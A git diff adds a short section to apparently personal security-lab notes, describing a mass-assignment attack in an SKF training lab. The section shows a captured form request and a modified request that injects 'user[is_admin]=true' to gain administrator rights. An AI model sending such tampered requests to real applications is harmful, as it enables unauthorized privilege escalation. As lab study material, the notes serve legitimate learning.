@@ -30,6 +30,30 @@ If you go to the website, there are a new message
 
 Now you can login with the mail
 
+# skf lab
+
+You can try
+
+![](../../Images/Pasted%20image%2020230823185442.png)
+
+In this case we have this information that are sending to the server
+
+````bash
+utf8=â&_method=patch&authenticity_token=RSG7XCsCTfPMxMFEopgmcDf+TRdE8KYiFfTkdSUUaGfRRn9a7DCv3a639dZjDGXB4kjAluyzwW7jTGBevYU9FA==&_method=patch&user[username]=Gest&user[title]=The best script kiddie&commit=Update User
+````
+
+We copy a part and modified the properties that are sending, to discover the property to gran admin privilages
+
+If you don't know the property you can brute force manually or with a dictionary (not recommended)
+
+````bash
+Gest&user[is_admin]=true
+````
+
+````bash
+utf8=â&_method=patch&authenticity_token=RSG7XCsCTfPMxMFEopgmcDf+TRdE8KYiFfTkdSUUaGfRRn9a7DCv3a639dZjDGXB4kjAluyzwW7jTGBevYU9FA==&_method=patch&user[username]=Gest&user[is_admin]=true&user[title]=The best script kiddie&commit=Update User
+````
+
 
 
 ---
